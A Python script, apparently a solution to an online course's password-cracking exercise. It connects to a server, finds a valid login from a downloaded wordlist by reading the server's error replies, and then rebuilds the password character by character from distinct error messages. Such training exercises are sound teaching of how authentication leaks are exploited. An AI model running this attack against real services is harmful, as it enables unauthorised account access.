import argparse
import socket
import itertools
import string
import urllib.request
import json

parser = argparse.ArgumentParser(description='Stage 1/5: Establishing a connection')
parser.add_argument('ip', help="IP address")
parser.add_argument('port', type=int, help="Port number")
args = parser.parse_args()


def get_json(login, password):
    return json.dumps({'login': login, 'password': password}, indent=4)


def get_reply(json_string):
    return json.loads(json_string)['result']


def gen_char():
    for c in itertools.chain(string.ascii_letters, string.digits):
        yield c


with socket.socket() as client_socket:
    client_socket.connect((args.ip, args.port))

    # Find login
    correct_login = ''
    for line in urllib.request.urlopen('https://stepik.org/media/attachments/lesson/255258/logins.txt'):
        login_candidate = line.decode().strip()
        client_socket.send(get_json(login_candidate, '').encode())
        if get_reply(client_socket.recv(1024).decode()) == 'Wrong password!':
            correct_login = login_candidate
            break

    # Find password
    correct_password = ''
    current_password = ''
    MAX_PWD_LENGTH = 20
    while not correct_password:
        for char in gen_char():
            password_candidate = current_password + char
            client_socket.send(get_json(correct_login, password_candidate).encode())
            match get_reply(client_socket.recv(1024).decode()):
                case 'Exception happened during login':
                    current_password += char
                    break
                case 'Connection success!':
                    correct_password = password_candidate
                    break

    print(get_json(correct_login, correct_password))
